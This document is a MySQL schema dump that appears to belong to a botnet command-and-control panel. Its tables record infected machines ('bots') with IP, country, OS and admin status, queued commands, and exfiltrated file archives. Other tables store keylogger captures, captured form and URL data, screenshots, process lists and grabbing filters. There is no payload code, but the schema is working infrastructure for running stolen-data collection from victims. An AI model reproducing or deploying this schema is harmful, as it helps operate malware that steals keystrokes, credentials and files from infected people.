SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;


DROP TABLE IF EXISTS `bf_bots`;
CREATE TABLE `bf_bots` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `uid` varchar(128) NOT NULL,
  `prefix` varchar(64) NOT NULL,
  `country` varchar(64) NOT NULL,
  `os` varchar(128) DEFAULT NULL,
  `admin` enum('0','1') NOT NULL DEFAULT '0',
  `ip` varchar(32) NOT NULL,
  `cmd` varchar(255) NOT NULL,
  `cmd_history` text NOT NULL,
  `notask` int(11) unsigned NOT NULL DEFAULT '0',
  `tracking` enum('0','1') NOT NULL DEFAULT '0',
  `min_post` int(11) unsigned NOT NULL,
  `max_post` int(11) unsigned NOT NULL,
  `post_id` int(11) unsigned DEFAULT NULL,
  `last_date` int(11) unsigned NOT NULL,
  `post_date` int(15) unsigned NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `bot` (`prefix`,`uid`),
  KEY `country` (`country`),
  KEY `prefix` (`prefix`),
  KEY `os` (`os`,`admin`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `bf_bots_ip`;
CREATE TABLE `bf_bots_ip` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(20) NOT NULL,
  `uid` varchar(34) NOT NULL,
  `ip` varchar(32) NOT NULL,
  `country` varchar(10) NOT NULL,
  `post_id` int(11) unsigned DEFAULT NULL,
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uniq` (`prefix`,`uid`,`ip`),
  KEY `bot` (`prefix`,`uid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `bf_cabs`;
CREATE TABLE `bf_cabs` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(20) NOT NULL,
  `uid` varchar(34) NOT NULL,
  `country` varchar(3) NOT NULL DEFAULT 'UNK',
  `ip` varchar(16) NOT NULL,
  `file` varchar(64) NOT NULL,
  `size` varchar(64) NOT NULL,
  `type` varchar(32) NOT NULL,
  `trash` enum('0','1') NOT NULL,
  `ready` int(1) unsigned NOT NULL DEFAULT '0',
  `parts` int(11) unsigned NOT NULL,
  `partc` int(11) unsigned NOT NULL,
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `prefix_uid` (`prefix`,`uid`),
  KEY `prefix` (`prefix`),
  KEY `post_date` (`post_date`),
  KEY `type` (`type`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `bf_cabs_parts`;
CREATE TABLE `bf_cabs_parts` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `part` text NOT NULL,
  `size` varchar(64) NOT NULL,
  `count` smallint(11) unsigned NOT NULL,
  `post_id` int(11) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `bf_cmds`;
CREATE TABLE `bf_cmds` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` text NOT NULL,
  `country` text NOT NULL,
  `online` enum('1','2','3') NOT NULL DEFAULT '1',
  `cmd` text,
  `lt` enum('1','2') NOT NULL DEFAULT '1',
  `count` int(11) unsigned DEFAULT '0',
  `max` int(11) unsigned NOT NULL DEFAULT '0',
  `enable` enum('0','1') NOT NULL DEFAULT '1',
  `dev` enum('0','1') NOT NULL DEFAULT '0',
  `str` text NOT NULL,
  `post_id` int(11) unsigned NOT NULL,
  `post_date` int(15) unsigned NOT NULL,
  PRIMARY KEY (`id`),
  KEY `post_id` (`post_id`),
  KEY `online` (`online`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

DROP TABLE IF EXISTS `bf_comments`;
CREATE TABLE `bf_comments` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(20) NOT NULL,
  `uid` varchar(34) NOT NULL,
  `uniq` varchar(32) DEFAULT NULL,
  `comment` varchar(128) NOT NULL,
  `type` varchar(32) NOT NULL,
  `post_id` int(11) unsigned NOT NULL,
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `type` (`type`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `bf_country`;
CREATE TABLE `bf_country` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `code` varchar(16) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `code` (`code`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `bf_filters`;
CREATE TABLE `bf_filters` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(128) NOT NULL,
  `fields` text NOT NULL,
  `host` text,
  `save_log` enum('0','1') NOT NULL DEFAULT '0',
  `parent_id` text NOT NULL,
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

DROP TABLE IF EXISTS `bf_filters_files`;
CREATE TABLE `bf_filters_files` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `file` varchar(18) NOT NULL,
  `type` tinyint(11) unsigned NOT NULL,
  `size` int(11) unsigned NOT NULL,
  `import` enum('0','1') NOT NULL DEFAULT '0',
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `ftype` (`file`,`type`),
  KEY `itype` (`type`,`import`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

DROP TABLE IF EXISTS `bf_keylog`;
CREATE TABLE `bf_keylog` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(128) NOT NULL,
  `hash` varchar(32) NOT NULL,
  `post_id` int(11) unsigned NOT NULL,
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `hash` (`hash`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `bf_keylog_data`;
CREATE TABLE `bf_keylog_data` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(20) NOT NULL,
  `uid` varchar(34) NOT NULL,
  `hash` varchar(64) NOT NULL,
  `shash` varchar(64) NOT NULL,
  `data` text NOT NULL,
  `trash` enum('0','1') NOT NULL DEFAULT '0',
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `item` (`prefix`,`uid`,`hash`,`shash`),
  KEY `hash` (`hash`),
  KEY `shash` (`shash`),
  KEY `trash` (`trash`),
  KEY `bot` (`prefix`,`uid`),
  KEY `bot_hash` (`hash`,`shash`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `bf_links`;
CREATE TABLE `bf_links` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `link` varchar(128) NOT NULL,
  `dev` enum('0','1') NOT NULL,
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `bf_logs`;
CREATE TABLE `bf_logs` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `prefix` varchar(20) NOT NULL,
  `uid` varchar(34) NOT NULL,
  `url` varchar(255) NOT NULL,
  `data` text NOT NULL,
  `brw` varchar(16) NOT NULL,
  `protocol` varchar(16) NOT NULL,
  `ip` varchar(16) NOT NULL,
  `country` varchar(3) NOT NULL,
  `type` int(1) NOT NULL,
  `download` int(11) NOT NULL DEFAULT '0',
  `hour` tinyint(4) NOT NULL,
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `download` (`download`),
  KEY `bot` (`prefix`,`uid`),
  KEY `hour` (`hour`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `bf_process`;
CREATE TABLE `bf_process` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(20) NOT NULL,
  `uid` varchar(34) NOT NULL,
  `plist` text NOT NULL,
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `prefix` (`prefix`,`uid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `bf_process_stats`;
CREATE TABLE `bf_process_stats` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(64) NOT NULL,
  `count` int(99) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`),
  KEY `count` (`count`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `bf_screens`;
CREATE TABLE `bf_screens` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(20) NOT NULL,
  `uid` varchar(34) NOT NULL,
  `file` varchar(64) NOT NULL,
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `prefix_uid` (`prefix`,`uid`),
  KEY `prefix` (`prefix`),
  KEY `post_date` (`post_date`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

DROP TABLE IF EXISTS `bf_users`;
CREATE TABLE `bf_users` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `login` varchar(100) NOT NULL,
  `password` varchar(100) NOT NULL,
  `PHPSESSID` varchar(100) DEFAULT NULL,
  `expiry_date` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `config` longtext NOT NULL,
  `access` longtext NOT NULL,
  `info` longtext,
  `enable` enum('0','1') DEFAULT '0',
  `enter_date` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `update_date` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `user` (`login`,`password`),
  KEY `autorize` (`login`,`password`,`PHPSESSID`,`enable`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 PACK_KEYS=0 ROW_FORMAT=DYNAMIC;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
